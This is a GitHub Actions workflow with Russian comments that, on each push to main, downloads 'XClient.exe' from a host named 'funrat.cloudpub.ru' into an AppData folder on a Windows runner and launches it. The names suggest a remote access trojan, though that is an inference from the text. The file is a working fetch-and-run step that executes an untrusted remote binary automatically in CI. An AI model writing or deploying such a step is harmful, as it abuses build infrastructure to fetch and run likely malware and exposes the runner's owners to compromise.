name: Download and Run .exe file to AppData

on:
  push:
    branches:
      - main

jobs:
  download_and_run:
    runs-on: windows-latest  # Указываем, что задача будет выполняться на Windows

    steps:
      - name: Checkout code
        uses: actions/checkout@v2

      - name: Create target folder in AppData
        run: |
          $appDataPath = [System.Environment]::GetEnvironmentVariable("APPDATA")
          $targetFolder = Join-Path $appDataPath "MyApp"
          New-Item -Path $targetFolder -ItemType Directory -Force  # Создаем папку в AppData, если её нет

      - name: Download .exe file to AppData folder
        run: |
          $appDataPath = [System.Environment]::GetEnvironmentVariable("APPDATA")
          $targetFolder = Join-Path $appDataPath "MyApp"
          curl -L -o "$targetFolder\XClient.exe" https://funrat.cloudpub.ru/XClient.exe  # Скачиваем в папку в AppData

      - name: Run .exe file from AppData folder
        run: |
          $appDataPath = [System.Environment]::GetEnvironmentVariable("APPDATA")
          $targetFolder = Join-Path $appDataPath "MyApp"
          Start-Process -FilePath "$targetFolder\XClient.exe"  # Запуск .exe из папки AppData
